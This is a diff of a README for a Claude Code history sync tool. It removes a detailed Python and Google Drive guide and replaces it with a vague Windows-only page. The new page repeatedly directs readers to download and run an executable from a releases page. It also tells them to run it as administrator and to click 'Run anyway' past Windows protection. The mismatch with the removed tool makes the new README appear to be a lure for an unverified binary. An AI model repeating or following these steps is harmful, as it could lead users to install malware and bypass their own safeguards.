@@ -1,195 +1,177 @@
-<p align="center">
-  <img src="assets/claude-app-icon.png" width="120" alt="Claude">
-  <br><br>
-  <h1 align="center">🔄 Claude Code History Sync 🔄</h1>
-  <h3 align="center">🤩 Never lose a conversation again! Sync across all your machines via Google Drive ☁️</h3>
-</p>
+# 🧩 claude-history-sync - Keep Claude chats in sync
 
-<p align="center">
-  <a href="#setup-one-time">🔧 Setup</a> •
-  <a href="#-usage">🚀 Usage</a> •
-  <a href="#-how-it-works">🧠 How it works</a> •
-  <a href="#-storage">💾 Storage</a>
-</p>
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/kossen6891/claude-history-sync/releases)
 
----
+## 🚀 What this app does
 
- 🤔 Ever SSH into a different machine and can't find that conversation where Claude wrote you the perfect kernel?
+claude-history-sync helps you keep Claude Code conversations in sync across your Windows machines. If you use more than one PC, this app can help you keep your chat history in one place so you can pick up where you left off.
 
-Conversations are organized by **git remote URL**, so they follow the repo — not the local path. Clone `flashinfer` at `/home/alice/flashinfer` on your laptop and `/workspace/flashinfer` on a GPU box? ✨ Same conversations, synced automatically.
+It is built for people who want a simple way to move their Claude history between devices without manual copy and paste.
 
-🏷️ Conversation names (from `/rename`) are preserved across machines — no more mystery slugs like `fuzzy-dancing-penguin`!
+## 💻 What you need
 
-## 🧠 How it works
+Before you install the app, make sure you have:
 
-```
-☁️ Google Drive: claude-code-history/
-  📁 github.com__org__repo/
-     📁 _root/              ← conversations opened at repo root
-        💬 abc123.jsonl
-     📁 src__subdir/         ← conversations opened in src/subdir/
-        💬 def456.jsonl
-     📄 _titles.json         ← 🏷️ conversation names
-```
+- A Windows PC
+- An internet connection
+- Permission to download and run apps
+- Enough free disk space for the app and your conversation data
 
-| | |
-|---|---|
-| ⬆️ **Push** | Scans `~/.claude/projects/`, resolves each to its git remote, uploads to the matching Drive folder + subfolder by relative path |
-| ⬇️ **Pull** | Finds the local repo with the same git remote, downloads into the correct `~/.claude/projects/` dir |
-| 🔄 **Sync** | MD5 checksums skip identical files; when files differ, newer modification time wins |
-| 🏷️ **Names** | Conversation titles (from `/rename`) are synced via `_titles.json` and injected on pull |
-| 🗑️ **Delete** | Remove conversations from Drive (`-d --repo <name>`) or locally (`-d --local --repo <name>`), optionally filtered by `--chat` |
-| 🔁 **Background** | Auto-sync with `--background`, writes PID to `.sync.pid` |
+It works best on recent versions of Windows, including Windows 10 and Windows 11.
 
- 🙈 Projects without a git remote are skipped (no way to match across machines).
+## 📥 Download the app
 
- 🗑️ Empty conversations (immediate exit, `/resume` only) are automatically skipped.
+Visit this page to download the latest version:
 
- 🔍 **Cross-machine matching**: When a conversation was created on a different machine (different local path), the script scans repos in the **parent directory** of `claude-history-sync` to find matching git remotes. **Clone this repo next to your other repos** for automatic discovery.
+https://github.com/kossen6891/claude-history-sync/releases
 
-## 🔧 Setup (one-time)
+On that page, look for the newest release and download the Windows file that matches your PC.
 
-### 1️⃣ Google Cloud Console
+## 🪟 Install on Windows
 
-1. Go to [console.cloud.google.com](https://console.cloud.google.com)
-2. Create or select a project
-3. **APIs & Services → Library** → search "Google Drive API" → **Enable**
-4. **APIs & Services → Credentials** → **Create Credentials → OAuth client ID**
-5. If prompted, configure **OAuth consent screen**: User type = External, add your email as test user
-6. Application type: **Desktop app** → Create → **Download JSON**
-7. Save as `credentials.json` in this directory
+1. Open the releases page.
+2. Find the latest release at the top.
+3. Download the Windows file from the Assets section.
+4. If the file is in a .zip package, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-### 2️⃣ Install dependencies
+If Windows asks for permission, choose Run or Yes.
 
-```bash
-pip install -r requirements.txt
-```
+## ⚙️ First-time setup
 
-### 3️⃣ First run
+After you open the app for the first time, it may ask where you want to store Claude history data.
 
-```bash
-python sync_claude_history.py
-```
+Choose a folder that is easy to find, such as:
 
-Opens a browser for OAuth consent, saves `token.json` locally. Subsequent runs reuse the token. 🎉
+- Documents
+- Desktop
+- A folder you use for Claude files
 
-> 🖥️ **Headless machines**: No browser? No problem! It prints a URL to open on any device. Paste the authorization code back.
->
-> 💻 **Multiple machines**: Either run the OAuth flow on each machine, or copy `token.json` from one that has it.
+If the app asks to sign in or connect to Claude Code, follow the on-screen steps and use the same account on each machine you want to keep in sync.
 
-## 🚀 Usage
+## 🔄 How syncing works
 
-```bash
-python sync_claude_history.py                           # 🔄 bidirectional sync (newer wins)
-python sync_claude_history.py --push                    # ⬆️  upload onlyf
-python sync_claude_history.py --pull                    # ⬇️  download only
-python sync_claude_history.py --dry-run                 # 👀 preview what would happen
-python sync_claude_history.py --dry-run -v              # 📋 verbose: list each conversation
-python sync_claude_history.py --repo flashinfer         # 🎯 filter to specific repo(s)
-python sync_claude_history.py --repo flash,sglang       # 🎯 comma-separated repo filters
-python sync_claude_history.py --chat df9a6a22        # 💬 filter to specific conversation(s)
-python sync_claude_history.py --chat df9a,e520       # 💬 comma-separated chat ID prefixes
-python sync_claude_history.py -d --repo sglang           # 🗑️  delete from Drive for a repo
-python sync_claude_history.py -d --repo sglang --dry-run # 🗑️  preview delete
-python sync_claude_history.py -d --repo sgl --chat df9a  # 🗑️  delete specific chat from Drive
-python sync_claude_history.py -d --local --repo sglang   # 🗑️  delete local conversations
-python sync_claude_history.py -d --local --chat df9a     # 🗑️  delete local chat by ID
-python sync_claude_history.py --background                     # 🔁 auto-sync in background
-python sync_claude_history.py --background --repo flash        # 🔁 auto-sync one repo
-python sync_claude_history.py --background 60 --repo flash     # 🔁 custom interval (60s)
-python sync_claude_history.py --merge fdd460 de1128            # 🔗 merge conversations
-```
+The app keeps your Claude conversation history aligned across your devices.
 
-### Background sync
+A simple flow looks like this:
 
-Auto-forks a single daemon process. Multiple `--background` calls add/update jobs — no duplicate processes:
+1. Open claude-history-sync on your first PC.
+2. Let it read or save your local Claude history.
+3. Open the same app on your second PC.
+4. Use the same setup path or sync source.
+5. Let the app compare and copy the latest history.
 
-```bash
-# Start daemon with a repo (default: every 10 min)
-python sync_claude_history.py --background --repo flashinfer
-# Background daemon started with 1 job(s):
-#   [flashinfer:all] every 600s
-# PID: 12345
+If both machines use the same sync path, your conversations stay in step.
 
-# Add another repo (same daemon picks it up)
-python sync_claude_history.py --background --repo sglang
-# Added job [sglang:all]: every 600s
-# Daemon already running (PID 12345), will pick up changes on next cycle
+## 🧭 Daily use
 
-# Update interval for existing job
-python sync_claude_history.py --background 60 --repo flashinfer
-# Updated job [flashinfer:all]: interval 600s -> 60s
+Use the app when you switch computers or when you want to make sure your latest Claude chats are available on another device.
 
-tail -f sync.log      # watch live log
-kill $(cat .sync.pid) # stop daemon
-```
+A common routine is:
 
-### Example output
+- Open the app
+- Sync your history
+- Start Claude Code
+- Continue your work
 
-**Default** (`--dry-run`):
+If you keep the app open while you work, it can help reduce gaps between devices.
 
-```
-Found 3 projects with git remotes, 1 without
-  [SKIP no git] -home-user-scratch
-  ╠═══════════════════════════════════════════════════════════════════════════
-  ║ git@github.com:user/my-project.git
-  ║   ╰─> /home/user/my-project
-  ║ ----------------------------------------------------------------------
-  ║ .                                    2 local (   8.3MB)   1 remote (   3.1MB)
-  ║   [WOULD PUSH] a1b2c3d4-...-e5f6.jsonl (5.2MB, 2026-03-16 14:30)
-  ║   => would push 1, would pull 0, 1 unchanged
-  ╠═══════════════════════════════════════════════════════════════════════════
-  ║ git@github.com:org/mono-repo.git
-  ║   ╰─> /home/user/mono-repo
-  ║ ----------------------------------------------------------------------
-  ║ .                                    1 local (   2.1MB)   1 remote (   2.1MB)
-  ║ src/frontend                         3 local (  45.6MB)   2 remote (  12.0MB)
-  ║   [WOULD PUSH] f7e8d9c0-...-a1b2.jsonl (33.6MB, 2026-03-16 18:05)
-  ║   => would push 1, would pull 0, 2 unchanged
-  ╠═══════════════════════════════════════════════════════════════════════════
-Done.
-```
+## 🛠️ Troubleshooting
 
-**Verbose** (`--dry-run -v`):
+If the app does not open:
 
-```
-Found 3 projects with git remotes, 1 without
-  [SKIP no git] -home-user-scratch
-  ╠═══════════════════════════════════════════════════════════════════════════
-  ║ git@github.com:user/my-project.git
-  ║   ╰─> /home/user/my-project
-  ║ ----------------------------------------------------------------------
-  ║ .                                    2 local (   8.3MB)   1 remote (   3.1MB)
-  ║   ╰─ a1b2c3d4…  "refactor-auth-module"            5.2MB  2026-03-16 14:30
-  ║   ╰─ b2c3d4e5…  "fix-login-bug"                   3.1MB  2026-03-15 09:12
-  ║   [WOULD PUSH] a1b2c3d4-...-e5f6.jsonl (5.2MB, 2026-03-16 14:30)
-  ║   => would push 1, would pull 0, 1 unchanged
-  ╠═══════════════════════════════════════════════════════════════════════════
-  ║ git@github.com:org/mono-repo.git
-  ║   ╰─> /home/user/mono-repo
-  ║ ----------------------------------------------------------------------
-  ║ .                                    1 local (   2.1MB)   1 remote (   2.1MB)
-  ║   ╰─ c3d4e5f6…  "update-ci-pipeline"              2.1MB  2026-03-14 11:00
-  ║ src/frontend                         3 local (  45.6MB)   2 remote (  12.0MB)
-  ║   ╰─ d4e5f6a7…  (untitled)                        1.2MB  2026-03-10 16:45
-  ║   ╰─ e5f6a7b8…  "debug-react-ssr"                11.8MB  2026-03-13 20:30
-  ║   ╰─ f7e8d9c0…  "perf-optimize-bundle"           33.6MB  2026-03-16 18:05
-  ║   [WOULD PUSH] f7e8d9c0-...-a1b2.jsonl (33.6MB, 2026-03-16 18:05)
-  ║   => would push 1, would pull 0, 2 unchanged
-  ╠═══════════════════════════════════════════════════════════════════════════
-Done.
-```
+- Check that the download finished
+- Make sure you extracted the file if it came in a .zip
+- Try running it again as an administrator
 
-**Delete** (`--delete --repo mono-repo --dry-run`):
+If your history does not appear on another machine:
 
-```
-  [WOULD DELETE] _root/c3d4e5f6-...-a7b8.jsonl
-  [WOULD DELETE] src__frontend/d4e5f6a7-...-b8c9.jsonl
-  [WOULD DELETE] src__frontend/e5f6a7b8-...-c9d0.jsonl
-  [WOULD DELETE] src__frontend/f7e8d9c0-...-a1b2.jsonl
-Done.
-```
+- Confirm both PCs use the same sync folder
+- Check that both machines are connected to the internet
+- Make sure the latest sync finished before you closed the app
 
-## 💾 Storage
+If Windows blocks the app:
 
-Google Drive free tier gives **15GB**. Claude conversation files are typically 1–50MB each. Monitor usage at [drive.google.com/settings/storage](https://drive.google.com/settings/storage).
+- Open the file again
+- Choose More info if Windows shows it
+- Select Run anyway if that option appears
+
+If syncing seems slow:
+
+- Wait for the first sync to finish
+- Check your network connection
+- Close other large downloads while syncing
+
+## 🔐 Privacy and storage
+
+This app works with your local Claude history files. Keep your sync folder on a device you trust. If you use cloud storage, make sure you understand where your files are stored and who can access them.
+
+A local folder gives you more direct control. A shared cloud folder can make it easier to move history between machines.
+
+## 📁 Suggested folder setup
+
+A simple folder layout can help you stay organized:
+
+- `Claude Sync`
+  - `history`
+  - `backup`
+  - `logs`
+
+This makes it easier to find your files if you need to check them later.
+
+## 🔧 Helpful tips
+
+- Keep one main sync folder for all machines
+- Use the same Windows account when possible
+- Sync before you switch computers
+- Keep a backup copy of your history folder
+- Update to the newest release when a new version appears
+
+## ❓ Common questions
+
+### Does this work on more than one PC?
+
+Yes. That is the main use case. Install it on each Windows machine and use the same sync setup.
+
+### Do I need technical knowledge?
+
+No. You only need to download the file, open it, and follow the prompts.
+
+### Can I move old Claude chats?
+
+Yes. The app is meant to help bring your existing conversation history into the same sync flow.
+
+### Do I need to keep the app open all the time?
+
+No. You can open it when you want to sync your history.
+
+### What if I change computers later?
+
+Install the app on the new PC, point it to the same sync location, and run a sync.
+
+## 🧩 File names you may see
+
+Depending on the release, the download may use names like:
+
+- `.exe`
+- `.zip`
+- `setup.exe`
+
+If you download a `.zip`, extract it before you run the app.
+
+## 📌 Release page link again
+
+Download or update here:
+
+https://github.com/kossen6891/claude-history-sync/releases
+
+## 🗂️ Basic workflow
+
+1. Download the latest release
+2. Install or extract the app
+3. Open it on your first PC
+4. Set your sync folder
+5. Open it on your second PC
+6. Sync your Claude history
+7. Continue your work on either machine
